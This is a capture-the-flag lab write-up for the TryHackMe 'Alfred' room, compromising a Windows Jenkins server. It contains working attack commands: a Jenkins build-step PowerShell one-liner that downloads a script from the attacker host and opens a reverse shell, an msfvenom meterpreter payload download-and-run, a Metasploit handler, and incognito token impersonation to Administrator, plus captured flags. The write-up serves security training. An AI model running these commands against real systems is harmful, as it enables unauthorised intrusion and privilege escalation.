# THM - Alfred

#THM #Alfred #Jenkins #Windows #TokenImpersonation #incognito #meterpreter

Target: 10.10.158.201

## Kill chain

1. `-Pn` scan (host blocks ping) → 80, 3389, 8080
2. Jenkins 2.190.1 on 8080, default creds `admin:admin`
3. Jenkins build step = arbitrary command execution → PowerShell reverse shell
4. User flag from `bruce`'s desktop
5. Swap to a meterpreter session → `incognito` token impersonation → `BUILTIN\Administrator` → root flag

## Services

```
nmap 10.10.158.201 -Pn
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy
MAC Address: 02:76:AC:E9:5A:A1 (Unknown)

nmap -p80,3389,8080 -sV -O -A -Pn 10.10.158.201
```

> [!note] `-Pn` is required — the host doesn't answer ping, so a default scan reports it down.

## Creds

- `admin:admin` — Jenkins 2.190.1 on 8080

## Foothold

Jenkins build steps run as the service account, so the "Execute Windows batch command" box *is* the shell:

**Dashboard → Project 1 → Configure → Build Commands**

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.16.113:8001/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.113 -Port 9001
```

```bash
ncat -lvnp 9001
```

## Loot

```
PS C:\users\bruce\Desktop> type user.txt
79007a09481963edf2e1321abd9ae2a0

PS C:\Program Files (x86)\Jenkins> type secret.key
cb2ae36e1862a23b3adfd393282eae76f896f2efb0a4da79643e33afc616751e
```

## Privesc — token impersonation

Upgrade the PowerShell shell to meterpreter (incognito needs it):

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai \
  LHOST=<IP> LPORT=<PORT> -f exe -o shell-name.exe
```

```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.16.113:8001/shell-name.exe','shell-name.exe')"
start-process "shell-name.exe"
```

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.16.113
set LPORT 9002
run -j
sessions -i 1
```

Check what the Jenkins service account holds — the impersonation privileges are the whole point:

```
whoami /priv
```

```
load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrator"
getuid
migrate 668
```

> [!tip] Impersonating the token is not enough on its own — **migrate into a process already running as that identity** or the privileges drop when the thread exits.

```
cat c:\windows\system32\root.txt
dff0f748678f280250f25a45b8046b4a
```

## Flags

- user: `79007a09481963edf2e1321abd9ae2a0`
- root: `dff0f748678f280250f25a45b8046b4a`
